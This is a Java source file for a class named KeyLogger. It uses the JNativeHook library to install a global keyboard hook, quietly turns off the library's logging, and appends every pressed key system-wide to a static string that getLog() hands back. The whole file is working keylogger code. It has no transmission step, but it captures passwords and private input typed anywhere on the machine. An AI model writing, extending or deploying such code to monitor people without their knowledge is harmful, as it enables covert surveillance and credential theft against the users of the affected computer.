package utils;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.logging.Logger;

/**
 * @author vakho
 */
public class KeyLogger implements NativeKeyListener {
    private static Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
    private static final String RIGHT_SHIFT_KEYCODE = "0xe36";
    private static final String RIGHT_SHIFT_KEY_TEXT = "Shift";
    private static final String SPLITTER = ";";
    private static final String NONE = "";
    private static final String FORMAT = SPLITTER + "%s" + SPLITTER;
    private static String temp = "";
    private static boolean IS_FIRST_SPlIT = true;

    public static String getLog() {
        return temp;
    }

    public static void start() {
        logger.setUseParentHandlers(false);
        try {
            GlobalScreen.registerNativeHook();

        } catch (NativeHookException e) {
            e.printStackTrace();
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        /**
         * MAX STRING RESET
         */
        if (temp.length() == Integer.MAX_VALUE) {
            temp = "";
        }
        /**
         * IF KEYCODE IS NOT CHARACTER|NUMERIC
         * THEN APPEND WITH SPLITTER
         * ELSE NORMAL APPEND
         */
        if (keyText.length() > 1) {
            if (IS_FIRST_SPlIT) {
                temp += String.format(FORMAT, keyText.contains(RIGHT_SHIFT_KEYCODE) ? RIGHT_SHIFT_KEY_TEXT : keyText);
                IS_FIRST_SPlIT = false;
                return;
            }
            temp += keyText.contains(RIGHT_SHIFT_KEYCODE) ? RIGHT_SHIFT_KEY_TEXT : keyText;
            return;
        }
        temp += keyText;
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
